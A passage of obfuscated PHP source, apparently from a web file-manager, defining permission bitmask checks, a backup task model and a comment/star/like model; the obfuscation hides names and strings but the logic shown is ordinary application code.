$ŸÀË¾â°[1837] => 1, $ŸÀË¾â°[1838] => 1, $ŸÀË¾â°[1839] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ŸÀË¾â°[429] => LNG($ŸÀË¾â°[1840]), $ŸÀË¾â°[1835] => $ŸÀË¾â°[1841], $ŸÀË¾â°[1837] => 2, $ŸÀË¾â°[1838] => 1, $ŸÀË¾â°[1839] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ŸÀË¾â°[429] => LNG($ŸÀË¾â°[1842]), $ŸÀË¾â°[1835] => $ŸÀË¾â°[1843], $ŸÀË¾â°[1837] => 3, $ŸÀË¾â°[1838] => 1, $ŸÀË¾â°[1839] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ŸÀË¾â°[429] => LNG($ŸÀË¾â°[1844]), $ŸÀË¾â°[1835] => $ŸÀË¾â°[1845], $ŸÀË¾â°[1837] => 4, $ŸÀË¾â°[1838] => 1, $ŸÀË¾â°[1839] => self::AUTH_SHOW | self::AUTH_VIEW), array($ŸÀË¾â°[429] => LNG($ŸÀË¾â°[1846]), $ŸÀË¾â°[1835] => $ŸÀË¾â°[1847], $ŸÀË¾â°[1837] => 5, $ŸÀË¾â°[1838] => 1, $ŸÀË¾â°[1839] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ŸÀË¾â°[429] => LNG($ŸÀË¾â°[1848]), $ŸÀË¾â°[1835] => $ŸÀË¾â°[1849], $ŸÀË¾â°[1837] => 6, $ŸÀË¾â°[1838] => 1, $ŸÀË¾â°[1839] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ŸÀË¾â°[429] => LNG($ŸÀË¾â°[1850]), $ŸÀË¾â°[1835] => $ŸÀË¾â°[1851], $ŸÀË¾â°[1837] => 7, $ŸÀË¾â°[1838] => 1, $ŸÀË¾â°[1839] => 0)); return $ş°îœúÇ; } public static function authCheck($“î¶áôÁ, $— Ö£) { $¾Ø¼Ñã =& $_SERVER[ïëó©ÒÚ]; $“î¶áôÁ = intval($“î¶áôÁ); if ($GLOBALS[$¾Ø¼Ñã[512]] && $GLOBALS[$¾Ø¼Ñã[6]][$¾Ø¼Ñã[1852]]) { return !0; } if ($“î¶áôÁ <= 0) { return !1; } if (($“î¶áôÁ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($“î¶áôÁ & $— Ö£); } public static function authCheckShow($àşìî•) { return self::authCheck($àşìî•, self::AUTH_SHOW); } public static function authCheckView($©ò’Õ£) { return self::authCheck($©ò’Õ£, self::AUTH_VIEW); } public static function authCheckDownload($¥öâø¼•) { return self::authCheck($¥öâø¼•, self::AUTH_DOWNLOAD); } public static function authCheckUpload($®Æò¬”ú) { return self::authCheck($®Æò¬”ú, self::AUTH_UPLOAD); } public static function authCheckEdit($Üïî¯Ğé) { return self::authCheck($Üïî¯Ğé, self::AUTH_EDIT); } public static function authCheckRemove($¼¾§É–¯) { return self::authCheck($¼¾§É–¯, self::AUTH_REMOVE); } public static function authCheckShare($ò…Ë™ŠÄ) { return self::authCheck($ò…Ë™ŠÄ, self::AUTH_SHARE); } public static function authCheckComment($õæËñÔÛ) { return self::authCheck($õæËñÔÛ, self::AUTH_COMMENT); } public static function authCheckEvent($©î»Ø¬¨) { return self::authCheck($©î»Ø¬¨, self::AUTH_EVENT); } public static function authCheckRoot($¨ìóèñĞ) { return self::authCheck($¨ìóèñĞ, self::AUTH_ROOT); } public static function authCheckAction($ü‚×ò€…, $åªàãíª) { $Œ‹ƒ”õ =& $_SERVER[ïëó©ÒÚ]; $»Ë—¶É = array($Œ‹ƒ”õ[1853] => self::AUTH_VIEW, $Œ‹ƒ”õ[1202] => self::AUTH_DOWNLOAD, $Œ‹ƒ”õ[107] => self::AUTH_UPLOAD, $Œ‹ƒ”õ[1803] => self::AUTH_EDIT, $Œ‹ƒ”õ[1802] => self::AUTH_REMOVE, $Œ‹ƒ”õ[1813] => self::AUTH_SHARE, $Œ‹ƒ”õ[354] => self::AUTH_COMMENT, $Œ‹ƒ”õ[1649] => self::AUTH_EVENT, $Œ‹ƒ”õ[1854] => self::AUTH_ROOT); if (!isset($»Ë—¶É[$åªàãíª])) { return; } $¦«¢ÔäŠ = $»Ë—¶É[$åªàãíª]; $ü‚×ò€… = intval($ü‚×ò€…); if ($ü‚×ò€… <= 0) { return !1; } if (($ü‚×ò€… & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ü‚×ò€… & $¦«¢ÔäŠ); } public static function authDisable($ÆÚÄ¬¥¢, $Ü¶£ã½Ã) { if (intval($ÆÚÄ¬¥¢) <= 0) { return 0; } return intval($ÆÚÄ¬¥¢) & ~$Ü¶£ã½Ã; } public $optionType = "\123\x79\163\164\x65\x6d\x2e\x73\157\x75\162\143\x65\x41\165\x74\150\x4c\151\163\164"; public $field = array("\x6e\x61\155\x65", "\141\x75\164\x68", "\x6c\x61\x62\145\154", "\144\x69\163\160\x6c\x61\171", "\163\x79\x73\x74\145\155", "\163\157\x72\x74"); public function initData() { $½¯’”ÉÉ = $this->authDefault(); foreach ($½¯’”ÉÉ as $‰ˆÁÕ••) { $this->add($‰ˆÁÕ••); } } public function findAuth($üêäîÁ¶, $Í­Á”š) { $±éêŒ™é =& $_SERVER[ïëó©ÒÚ]; $Ï¡¶öáß = parent::listData(); foreach ($Ï¡¶öáß as $ ÌóÛÃ±) { $×Æ›ôÈ = intval($ ÌóÛÃ±[$±éêŒ™é[422]]); if ($×Æ›ôÈ <= 0 || $ ÌóÛÃ±[$±éêŒ™é[1855]] == 0) { continue; } if (($×Æ›ôÈ & $üêäîÁ¶) != $üêäîÁ¶) { continue; } if (($×Æ›ôÈ & $Í­Á”š) != 0) { continue; } return $ ÌóÛÃ±[$±éêŒ™é[399]]; } return !1; } public function findAuthReadOnly() { $¶¹¤ÉÅä = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $şÆ­¦“Å = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($¶¹¤ÉÅä, $şÆ­¦“Å); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $­Á‚÷† =& $_SERVER[ïëó©ÒÚ]; $ë½¸‹÷ = parent::listData(); $¯Š‡Ãü° = !1; foreach ($ë½¸‹÷ as $í™ßùú) { if ($í™ßùú[$­Á‚÷†[422]] <= 0 || $í™ßùú[$­Á‚÷†[1855]] == $­Á‚÷†[197]) { continue; } if (!$¯Š‡Ãü°) { $¯Š‡Ãü° = $í™ßùú; continue; } if ($¯Š‡Ãü°[$­Á‚÷†[422]] > $í™ßùú[$­Á‚÷†[422]]) { $¯Š‡Ãü° = $í™ßùú; } } return $¯Š‡Ãü° ? $¯Š‡Ãü°[$­Á‚÷†[399]] : $­Á‚÷†[12]; } public function listData($€™ù×¡œ = false, $»Éû‰ÌĞ = "\x73\157\x72\164", $Ôšò¨° = false) { return parent::listData($€™ù×¡œ, $»Éû‰ÌĞ, $Ôšò¨°); } public function update($¹ÚåÆÔ, $ï¯éÇæ) { $¢Ôş’ó¢ =& $_SERVER[ïëó©ÒÚ]; $³¡ÛÄ  = parent::listData($¹ÚåÆÔ); $áè­ÓÀ = $this->findByName($ï¯éÇæ[$¢Ôş’ó¢[32]]); if (!$³¡ÛÄ  || $áè­ÓÀ && $áè­ÓÀ[$¢Ôş’ó¢[399]] != $³¡ÛÄ [$¢Ôş’ó¢[399]]) { return !1; } $this->filterAuth($ï¯éÇæ[$¢Ôş’ó¢[422]]); return parent::update($¹ÚåÆÔ, $ï¯éÇæ); } public function remove($§³¿¨´ç) { $÷‹€Š¼ = parent::listData($§³¿¨´ç); if (!$÷‹€Š¼ || $÷‹€Š¼[$_SERVER[ïëó©ÒÚ][1279]]) { return !1; } return parent::remove($§³¿¨´ç); } public function add($˜İæÛÜ = array()) { $î¢ÀÓ´ù =& $_SERVER[ïëó©ÒÚ]; if ($this->findByName($˜İæÛÜ[$î¢ÀÓ´ù[32]])) { return !1; } $ñ¬•ñì = array($î¢ÀÓ´ù[32] => $î¢ÀÓ´ù[12], $î¢ÀÓ´ù[422] => 1, $î¢ÀÓ´ù[1856] => $î¢ÀÓ´ù[1843], $î¢ÀÓ´ù[1855] => 1, $î¢ÀÓ´ù[1279] => 0, $î¢ÀÓ´ù[1857] => 0); $˜İæÛÜ = array_merge($ñ¬•ñì, $˜İæÛÜ); $˜İæÛÜ[$î¢ÀÓ´ù[1857]] = $this->getSort(); $this->filterAuth($˜İæÛÜ[$î¢ÀÓ´ù[422]]); return parent::insert($˜İæÛÜ); } private function getSort() { $Çò‹ÍÏæ =& $_SERVER[ïëó©ÒÚ]; $Ü…²î´ = parent::listData(); $Øêşõø¯ = array_to_keyvalue($Ü…²î´, $Çò‹ÍÏæ[12], $Çò‹ÍÏæ[1857]); return empty($Øêşõø¯) ? 0 : max($Øêşõø¯) + 1; } private function filterAuth(&$ô©Åºøú) { if (!$ô©Åºøú) { return; } $ôæü¨ØÖ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ÏóÒäŞê = array(); foreach ($ôæü¨ØÖ as $¶¢ˆï“ı) { if ($ô©Åºøú & $¶¢ˆï“ı) { $ÏóÒäŞê[] = $¶¢ˆï“ı; } } if (in_array(self::AUTH_ROOT, $ÏóÒäŞê)) { $ô©Åºøú = array_sum($ôæü¨ØÖ); return; } $èä”ªËŞ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ÏóÒäŞê as $¶¢ˆï“ı) { if (isset($èä”ªËŞ[$¶¢ˆï“ı])) { $ÏóÒäŞê = array_merge($ÏóÒäŞê, $èä”ªËŞ[$¶¢ˆï“ı]); } } $ÏóÒäŞê[] = self::AUTH_SHOW; $ô©Åºøú = array_sum(array_unique($ÏóÒäŞê)); } public function sort($É¡àé², $áõº°Ä£) { return parent::update($É¡àé², $áõº°Ä£); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\x62\141\x63\153\165\160\x4c\x69\x73\164"; public $field = array("\x69\x6f", "\156\141\x6d\145", "\x73\x74\141\164\x75\x73", "\x63\157\156\164\x65\x6e\x74", "\155\141\156\165\x61\x6c", "\x72\145\163\x75\154\x74", "\164\x69\155\x65\106\162\157\155", "\x74\x69\155\145\x54\157"); public function config() { $·†º›à° =& $_SERVER[ïëó©ÒÚ]; $¢¬ÅÖ„Ş = Model($·†º›à°[780])->get($·†º›à°[790]); $¢¬ÅÖ„Ş = json_decode($¢¬ÅÖ„Ş, !0); $¢¬ÅÖ„Ş = is_array($¢¬ÅÖ„Ş) ? $¢¬ÅÖ„Ş : array(); if (!isset($¢¬ÅÖ„Ş[$·†º›à°[765]])) { $¢¬ÅÖ„Ş[$·†º›à°[765]] = $·†º›à°[88]; } unset($¢¬ÅÖ„Ş[$·†º›à°[1631]]); Action($·†º›à°[1858])->taskInit(); Model($·†º›à°[1630])->cacheClear(); $½›»‰œ = $·†º›à°[1859]; $ãƒà±šº = Model($·†º›à°[1860])->findByKey($·†º›à°[1649], $½›»‰œ); if (!$ãƒà±šº) { $ãƒà±šº = array(); } if (isset($ãƒà±šº[$·†º›à°[203]])) { $ãƒà±šº[$·†º›à°[203]] = json_decode($ãƒà±šº[$·†º›à°[203]], !0); } if (isset($¢¬ÅÖ„Ş[$·†º›à°[203]])) { $ãƒà±šº[$·†º›à°[203]][$·†º›à°[1634]] = $¢¬ÅÖ„Ş[$·†º›à°[203]]; unset($¢¬ÅÖ„Ş[$·†º›à°[203]]); } return array_merge($ãƒà±šº, $¢¬ÅÖ„Ş); } public function listData($Œ¿ÚÀ· = false, $ş×Á‚ = "\x6d\157\x64\151\x66\171\124\151\155\x65", $³ ›Ü†Á = false) { return parent::listData($Œ¿ÚÀ·, $ş×Á‚, !0); } public function lastItem() { $¨†¤¤å¥ = $this->listData(); return !empty($¨†¤¤å¥[0]) ? $¨†¤¤å¥[0] : null; } public function kill($ä„ˆ©û) { $å»Ğìø =& $_SERVER[ïëó©ÒÚ]; $Î‰áÀïô = $this->listData($ä„ˆ©û); if (!$Î‰áÀïô || empty($Î‰áÀïô[$å»Ğìø[32]])) { return !0; } Task::kill($å»Ğìø[789]); Task::kill($å»Ğìø[810]); Task::kill($å»Ğìø[819]); $§ğÀêŸĞ = $Î‰áÀïô[$å»Ğìø[32]]; $üµÆ˜à¨ = TEMP_FILES . $å»Ğìø[788] . $§ğÀêŸĞ . $å»Ğìø[8]; IO::remove($üµÆ˜à¨, !1); return $this->remove($ä„ˆ©û); } public function remove($Ã¢§¥Ã) { $÷²öá×ï = $this->listData($Ã¢§¥Ã); if (!$÷²öá×ï) { return !0; } return $this->backupRemove($÷²öá×ï); } private function backupRemove($›–¼ªİ) { parent::remove($›–¼ªİ[$_SERVER[ïëó©ÒÚ][399]]); $çïÓ´Ø = $this->backupPath($›–¼ªİ); IO::remove($çïÓ´Ø, !1); return !0; } private function backupPath($–±¤’½”) { $ì©™‚êÕ =& $_SERVER[ïëó©ÒÚ]; $ÀÁ’ş˜ = $–±¤’½”[$ì©™‚êÕ[32]]; $ŸÙïäÀè = Model($ì©™‚êÕ[780])->get($ì©™‚êÕ[781]); $ÕƒıàŞŸ = substr(md5($ì©™‚êÕ[782] . $ŸÙïäÀè . $ÀÁ’ş˜), 0, 8); return "\173\151\157\72{$–±¤’½”[$ì©™‚êÕ[762]]}\x7d\x2f\144\141\164\141\142\x61\163\145\x2f\142\x61\143\153\165\160\x2f" . $ÀÁ’ş˜ . $ì©™‚êÕ[11] . $ÕƒıàŞŸ; } public function start() { $éÁ†…á =& $_SERVER[ïëó©ÒÚ]; if ($GLOBALS[$éÁ†…á[6]][$éÁ†…á[89]][$éÁ†…á[1861]] != $éÁ†…á[88]) { return !0; } $®¾¡šÄÒ = $this->config(); if (!$®¾¡šÄÒ || $®¾¡šÄÒ[$éÁ†…á[1631]] != $éÁ†…á[88]) { return !1; } $®ô–È‡ö = $this->process(); foreach ($®ô–È‡ö as $…ÏŒº™™) { if ($…ÏŒº™™) { return Task::restart($…ÏŒº™™[$éÁ†…á[399]]); } } $í«™¾äÂ = new Backup(); $È…½Ë˜š = $í«™¾äÂ->db(); if ($È…½Ë˜š) { $È…½Ë˜š = $í«™¾äÂ->dbFile(); if ($È…½Ë˜š && $®¾¡šÄÒ[$éÁ†…á[765]] == $éÁ†…á[197]) { $È…½Ë˜š = $í«™¾äÂ->file(); } } Backup::set(array($éÁ†…á[760] => 1, $éÁ†…á[506] => time())); return !0; } public function process() { $ëğáÍé =& $_SERVER[ïëó©ÒÚ]; $šò–Ñ¡ = array($ëğáÍé[768] => Task::get($ëğáÍé[789]), $ëğáÍé[772] => Task::get($ëğáÍé[810]), $ëğáÍé[199] => Task::get($ëğáÍé[819])); $‘ó›¦ìÊ = !1; foreach ($šò–Ñ¡ as &$Õ¹÷·îú) { if ($‘ó›¦ìÊ) { $Õ¹÷·îú = !1; continue; } if ($Õ¹÷·îú) { $õóğÍÊ– = intval(_get($Õ¹÷·îú, $ëğáÍé[1666], 0)); if (time() - $õóğÍÊ– > 7200) { Task::kill($Õ¹÷·îú[$ëğáÍé[399]]); $‘ó›¦ìÊ = !0; $Õ¹÷·îú = !1; } } } return $šò–Ñ¡; } public function restore() { $ŠÂ¥È« =& $_SERVER[ïëó©ÒÚ]; ActionCall($ŠÂ¥È«[1063], !0, 1); ActionCall($ŠÂ¥È«[1063], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\x65\x6e\x74"; protected $tableMeta = array("\164\141\x62\154\x65\116\141\x6d\x65" => "\x63\x6f\155\x6d\145\x6e\x74\137\x6d\x65\164\141", "\x6d\145\164\141\106\151\x65\x6c\144" => "\x63\x6f\155\155\x65\156\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Ûè»Ìé³) { $ ±”ñªí =& $_SERVER[ïëó©ÒÚ]; if ($Ûè»Ìé³[$ ±”ñªí[1862]]) { $æà«¾ÉÏ = $this->where(array($ ±”ñªí[1863] => $Ûè»Ìé³[$ ±”ñªí[1862]]))->find(); if (!$æà«¾ÉÏ || $æà«¾ÉÏ[$ ±”ñªí[420]] != $Ûè»Ìé³[$ ±”ñªí[420]] || $æà«¾ÉÏ[$ ±”ñªí[514]] != $Ûè»Ìé³[$ ±”ñªí[514]]) { return !1; } $this->where(array($ ±”ñªí[1863] => $Ûè»Ìé³[$ ±”ñªí[1862]]))->setAdd($ ±”ñªí[1864], 1); } $Ûè»Ìé³[$ ±”ñªí[1865]] = 0; $Ûè»Ìé³[$ ±”ñªí[1864]] = 0; $Ûè»Ìé³[$ ±”ñªí[760]] = 1; return $this->add($Ûè»Ìé³); } public function commentCount($¼ØÙâ¯ı, $‡É²ØÑ, $¤òÜÒ¿ = false) { $Â˜Ë¡ôà =& $_SERVER[ïëó©ÒÚ]; if (!$¼ØÙâ¯ı) { return array(); } if (is_string($¼ØÙâ¯ı) || is_int($¼ØÙâ¯ı)) { $¼ØÙâ¯ı = array($¼ØÙâ¯ı); } $©¥Û®¢ = array($Â˜Ë¡ôà[514], $Â˜Ë¡ôà[1866] => $Â˜Ë¡ôà[509]); $°è»×Éâ = array($Â˜Ë¡ôà[514] => array($Â˜Ë¡ôà[7], $¼ØÙâ¯ı), $Â˜Ë¡ôà[420] => $‡É²ØÑ); if ($¤òÜÒ¿) { $°è»×Éâ[$Â˜Ë¡ôà[1661]] = $¤òÜÒ¿; } $™¾‚ÄÇİ = $this->field($©¥Û®¢)->where($°è»×Éâ)->group($Â˜Ë¡ôà[514])->select(); return array_to_keyvalue($™¾‚ÄÇİ, $Â˜Ë¡ôà[514], $Â˜Ë¡ôà[509]); } public function starTarget($æ‹ËÁœÂ, $¬›ƒÇ‘) { $ëÊ‡ô¨ß =& $_SERVER[ïëó©ÒÚ]; $ö¹š¢å¾ = $æ‹ËÁœÂ + self::TYPE_STAR_OFFSET; $ã‚ª£à = array($ëÊ‡ô¨ß[1661] => USER_ID, $ëÊ‡ô¨ß[420] => $ö¹š¢å¾, $ëÊ‡ô¨ß[514] => $¬›ƒÇ‘); $˜Ø×ŸØî = $this->where($ã‚ª£à)->find(); if ($˜Ø×ŸØî) { return $this->where(array($ëÊ‡ô¨ß[399] => $˜Ø×ŸØî[$ëÊ‡ô¨ß[399]]))->delete(); } $Ùéœß¹ = array($ëÊ‡ô¨ß[1862] => 0, $ëÊ‡ô¨ß[1661] => USER_ID, $ëÊ‡ô¨ß[760] => 1, $ëÊ‡ô¨ß[765] => $ëÊ‡ô¨ß[12], $ëÊ‡ô¨ß[420] => $ö¹š¢å¾, $ëÊ‡ô¨ß[514] => $¬›ƒÇ‘, $ëÊ‡ô¨ß[1865] => 0, $ëÊ‡ô¨ß[1864] => 0); return $this->add($Ùéœß¹); } public function starTargetCount($¾¦¨Ò”¯, $ä‚ø½ˆ) { $«ˆâÇ =& $_SERVER[ïëó©ÒÚ]; $‰®¢´ = $ä‚ø½ˆ + self::TYPE_STAR_OFFSET; $ãÔ¹²Ãè = $this->commentCount($¾¦¨Ò”¯, $‰®¢´); $„úÁºÕ© = $this->commentCount($¾¦¨Ò”¯, $‰®¢´, USER_ID); return array($«ˆâÇ[1867] => $ãÔ¹²Ãè, $«ˆâÇ[1868] => $„úÁºÕ©); } public function starTargetUserList($è·…éˆÎ, $„şà‹—Û) { $ıìŒ¡øß =& $_SERVER[ïëó©ÒÚ]; $ŞÄ®™ò¸ = $è·…éˆÎ + self::TYPE_STAR_OFFSET; $ôïÁ²˜ = array($ıìŒ¡øß[514] => $„şà‹—Û, $ıìŒ¡øß[420] => $ŞÄ®™ò¸); $½Ï§Ãëä = $this->where($ôïÁ²˜)->count(); $ÏŞ¨×… = array($ıìŒ¡øß[255] => $½Ï§Ãëä, $ıìŒ¡øß[1869] => array()); if (!$½Ï§Ãëä) { return $ÏŞ¨×…; } $ªœøÔ¨ = $this->field($ıìŒ¡øß[1661])->where($ôïÁ²˜)->limit(500)->select(); $ªœøÔ¨ = array_to_keyvalue($ªœøÔ¨, $ıìŒ¡øß[12], $ıìŒ¡øß[1661]); $ÏŞ¨×…[$ıìŒ¡øß[1869]] = Model($ıìŒ¡øß[522])->userListInfo($ªœøÔ¨); return $ÏŞ¨×…; } public function prasiseUserList($éİ¸ÚÌ§) { $úùŠ¼íê =& $_SERVER[ïëó©ÒÚ]; $¶€¶ôØ… = array($úùŠ¼íê[1870] => $éİ¸ÚÌ§); $ì«¯ı»¸ = $this->where($¶€¶ôØ…)->find(); $†¥ÜŒàõ = _get($ì«¯ı»¸, $úùŠ¼íê[1865], 0); $ø±Ñß¸Ù = array($úùŠ¼íê[255] => $†¥ÜŒàõ, $úùŠ¼íê[1869] => array()); if (!$†¥ÜŒàõ) { return $ø±Ñß¸Ù; } $àŒšËªÌ = Model($úùŠ¼íê[1871])->field($úùŠ¼íê[1661])->where($¶€¶ôØ…)->limit(500)->select(); $àŒšËªÌ = array_to_keyvalue($àŒšËªÌ, $úùŠ¼íê[12], $úùŠ¼íê[1661]); $ø±Ñß¸Ù[$úùŠ¼íê[1869]] = Model($úùŠ¼íê[522])->userListInfo($àŒšËªÌ); return $ø±Ñß¸Ù; } public function remove($ğ¾á À) { $Ëû¬×’· =& $_SERVER[ïëó©ÒÚ]; $“éùİŞæ = array($Ëû¬×’·[1863] => $ğ¾á À); $ÍÈÜô = $this->where($“éùİŞæ)->find(); if ($ÍÈÜô[$Ëû¬×’·[1862]]) { $this->where(array($Ëû¬×’·[1863] => $ÍÈÜô[$Ëû¬×’·[1862]]))->setAdd($Ëû¬×’·[1864], -1); } return $this->where($“éùİŞæ)->delete(); } public function edit($å¡¤ÆŸô, $ŸßóÔÈŠ) { $êèîıê¿ =& $_SERVER[ïëó©ÒÚ]; $“èãÏ‘Ù = array($êèîıê¿[1863] => $å¡¤ÆŸô); return $this->where($“èãÏ‘Ù)->save(array($êèîıê¿[1872] => $ŸßóÔÈŠ)); } public function prasise($ºÅ ”) { $ˆ¾àÂÔ± =& $_SERVER[ïëó©ÒÚ]; $²“©™Ç¨ = Model($ˆ¾àÂÔ±[1873]); $÷ÖÖ…ÅŠ = array($ˆ¾àÂÔ±[1863] => $ºÅ ”, $ˆ¾àÂÔ±[1652] => USER_ID); $ˆ¿úÄúÔ = $²“©™Ç¨->where($÷ÖÖ…ÅŠ)->find(); if (!$ˆ¿úÄúÔ) { $²“©™Ç¨->add($÷ÖÖ…ÅŠ); $¯¨ı‚œ = $this->where(array($ˆ¾àÂÔ±[1863] => $ºÅ ”))->setAdd($ˆ¾àÂÔ±[1865], 1); } else { $²“©™Ç¨->where($÷ÖÖ…ÅŠ)->delete(); $¯¨ı‚œ = $this->where(array($ˆ¾àÂÔ±[1863] => $ºÅ ”))->setAdd($ˆ¾àÂÔ±[1865], -1); } return $¯¨ı‚œ; } public function targetInfo($èâ£¥, $Á¹œğºı) { $¦³ë˜Ï¹ =& $_SERVER[ïëó©ÒÚ]; $Î¯ˆıùì = array($¦³ë˜Ï¹[595] => $èâ£¥, $¦³ë˜Ï¹[596] => $Á¹œğºı); $ŒšµÒÕ = $this->where($Î¯ˆıùì)->count(); $« æÔ˜œ = "\122\111\x47\x48\124\40\x4a\117\x49\x4e\40{$this->tablePrefix}\143\157\155\155\145\156\x74\x5f\x70\x72\x61\151\163\145\40\163\x74\141\x72\x20\157\156\40\143\x6f\155\x6d\x65\156\164\56\x63\x6f\155\x6d\x65\x6e\164\111\104\40\75\40\163\164\x61\162\56\143\x6f\x6d\x6d\145\x6e\164\x49\x44"; $¾äÀç“® = $this->alias($¦³ë˜Ï¹[354])->where($Î¯ˆıùì)->join($« æÔ˜œ, $¦³ë˜Ï¹[1874])->count(); $ŒÂÜ€ÁÌ = array($¦³ë˜Ï¹[1875] => $ŒšµÒÕ, $¦³ë˜Ï¹[1876] => $¾äÀç“®); return $ŒÂÜ€ÁÌ; } public function listData($‹ÃØ¶ï) { $¨‚¾ÌÔ¿ =& $_SERVER[ïëó©ÒÚ]; if (isset($‹ÃØ¶ï[$¨‚¾ÌÔ¿[1877]])) { if ($‹ÃØ¶ï[$¨‚¾ÌÔ¿[1877]]) { $‹ÃØ¶ï[$¨‚¾ÌÔ¿[1870]] = array($¨‚¾ÌÔ¿[1017], intval($‹ÃØ¶ï[$¨‚¾ÌÔ¿[1877]])); } unset($‹ÃØ¶ï[$¨‚¾ÌÔ¿[1877]]); } if (isset($‹ÃØ¶ï[$¨‚¾ÌÔ¿[1878]])) { if ($‹ÃØ¶ï[$¨‚¾ÌÔ¿[1878]]) { $‹ÃØ¶ï[$¨‚¾ÌÔ¿[1870]] = array($¨‚¾ÌÔ¿[1014], intval($‹ÃØ¶ï[$¨‚¾ÌÔ¿[1878]])); } unset($‹ÃØ¶ï[$¨‚¾ÌÔ¿[1878]]); } return $this->_listData($‹ÃØ¶ï); } private function _listData($¤¦‚è¡Ü) { $ßìÃ’µİ =& $_SERVER[ïëó©ÒÚ]; $‰ÙåëÃ× = $this->where($¤¦‚è¡Ü)->_makeOrder()->selectPage(100); $this->_listAppendParent($‰ÙåëÃ×[$ßìÃ’µİ[369]]); $this->_listAppendUser($‰ÙåëÃ×[$ßìÃ’µİ[369]]); $this->_listAppendMeta($‰ÙåëÃ×[$ßìÃ’µİ[369]]); return $‰ÙåëÃ×; } private function _makeOrder() { $£à¬…” =& $_SERVER[ïëó©ÒÚ]; $é¹ş£æ = array($£à¬…”[1865], $£à¬…”[1864], $£à¬…”[200]); $Ú¾³ú±Ã = Input::get($£à¬…”[466], $£à¬…”[7], $£à¬…”[432], $é¹ş£æ); $ÔÅ×û¡Õ = Input::get($£à¬…”[467], $£à¬…”[7], $£à¬…”[1654], array($£à¬…”[1879], $£à¬…”[462])); $Š‰Ù·ñ = $Ú¾³ú±Ã . $£à¬…”[53] . $ÔÅ×û¡Õ; return $this->order($Š‰Ù·ñ); } private function _listAppendParent(&$Ä“Ê„’¯) { $¯Ú™ó½ =& $_SERVER[ïëó©ÒÚ]; $ÉîÌÏã = array_unique(array_to_keyvalue($Ä“Ê„’¯, $¯Ú™ó½[12], $¯Ú™ó½[1862])); $ÉîÌÏã = array_remove_value($ÉîÌÏã, $¯Ú™ó½[197]); if (!$ÉîÌÏã) { return; } $¿½ûşĞ‹ = $this->where(array($¯Ú™ó½[1863] => array($¯Ú™ó½[7], $ÉîÌÏã)))->select(); $¿½ûşĞ‹ = array_to_keyvalue($¿½ûşĞ‹, $¯Ú™ó½[1870]); foreach ($Ä“Ê„’¯ as &$äµœÉá) { if (isset($¿½ûşĞ‹[$äµœÉá[$¯Ú™ó½[1862]]])) { $äµœÉá[$¯Ú™ó½[1880]] = $¿½ûşĞ‹[$äµœÉá[$¯Ú™ó½[1862]]]; } } unset($äµœÉá); } private function _listAppendUser(&$½˜…Ê¤İ) { $‚–Ù¬Í =& $_SERVER[ïëó©ÒÚ]; $ŸİÌÊ™Ô = array_unique(array_to_keyvalue($½˜…Ê¤İ, $‚–Ù¬Í[12], $‚–Ù¬Í[1661])); $ŸİÌÊ™Ô = array_remove_value($ŸİÌÊ™Ô, $‚–Ù¬Í[197]); if (count($ŸİÌÊ™Ô) == 0) { return; } foreach ($½˜…Ê¤İ as $»¢×„ÌÌ) { if (isset($»¢×„ÌÌ[$‚–Ù¬Í[1880]])) { $ŸİÌÊ™Ô[] = $»¢×„ÌÌ[$‚–Ù¬Í[1880]][$‚–Ù¬Í[1661]]; } } $›·¥…¸ = Model($‚–Ù¬Í[544])->userListInfo($ŸİÌÊ™Ô); foreach ($½˜…Ê¤İ as &$»¢×„ÌÌ) { $»¢×„ÌÌ[$‚–Ù¬Í[609]] = $›·¥…¸[$»¢×„ÌÌ[$‚–Ù¬Í[1661]]]; if (isset($»¢×„ÌÌ[$‚–Ù¬Í[1880]])) { $»¢×„ÌÌ[$‚–Ù¬Í[1880]][$‚–Ù¬Í[609]] = $›·¥…¸[$»¢×„ÌÌ[$‚–Ù¬Í[1880]][$‚–Ù¬Í[1661]]]; } } unset($»¢×„ÌÌ); } private function _listAppendMeta(&$šĞß Æ) { $³‡şÉô =& $_SERVER[ïëó©ÒÚ]; $¯ĞÎİ = array_unique(array_to_keyvalue($šĞß Æ, $³‡şÉô[12], $³‡şÉô[1870])); $¯ĞÎİ = array_remove_value($¯ĞÎİ, $³‡şÉô[197]); if (!$¯ĞÎİ) { return; } foreach 